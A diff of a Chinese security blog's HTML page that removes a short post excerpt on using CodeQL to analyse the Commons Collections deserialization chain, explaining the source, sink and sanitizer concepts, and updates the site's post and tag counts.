-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="blueSatchel's blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/05/12/%E4%BD%BF%E7%94%A8codeql%E7%9A%84cc%E9%93%BE%E5%88%86%E6%9E%90/" class="post-title-link" itemprop="url">使用codeql的cc链分析</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2022-05-12 16:38:44 / 修改时间：16:41:09" itemprop="dateCreated datePublished" datetime="2022-05-12T16:38:44+08:00">2022-05-12</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/codeql/" itemprop="url" rel="index"><span itemprop="name">codeql</span></a>
-                </span>
-            </span>
-
-          
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Valine：</span>
-    
-    <a title="valine" href="/2022/05/12/%E4%BD%BF%E7%94%A8codeql%E7%9A%84cc%E9%93%BE%E5%88%86%E6%9E%90/#valine-comments" itemprop="discussionUrl">
-      <span class="post-comments-count valine-comment-count" data-xid="/2022/05/12/%E4%BD%BF%E7%94%A8codeql%E7%9A%84cc%E9%93%BE%E5%88%86%E6%9E%90/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>使用codeql来分析cc链</p>
-<p>由于codeql无法多个数据库之间查询流,所以只能采用半条链拼接半条链的方式来进行操作</p>
-<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/283795.html">参考文章</a></p>
-<h4 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">什么是source和sink</span><br><span class="line"></span><br><span class="line">在代码自动化安全审计的理论当中，有一个最核心的三元组概念，就是(source，sink和sanitizer)。</span><br><span class="line"></span><br><span class="line">source是指漏洞污染链条的输入点。比如获取http请求的参数部分，就是非常明显的Source。</span><br><span class="line"></span><br><span class="line">sink是指漏洞污染链条的执行点，比如SQL注入漏洞，最终执行SQL语句的函数就是sink(这个函数可能叫query或者exeSql，或者其它)。</span><br><span class="line"></span><br><span class="line">sanitizer又叫净化函数，是指在整个的漏洞链条当中，如果存在一个方法阻断了整个传递链，那么这个方法就叫sanitizer。</span><br></pre></td></tr></table></figure>
-
-<p>分析cc1进行一次尝试</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1209,7 +1314,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">67</span>
+          <span class="site-state-item-count">70</span>
           <span class="site-state-item-name">文章</span>
         </a>
       </div>
@@ -1222,7 +1327,7 @@
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">64</span>
+        <span class="site-state-item-count">67</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
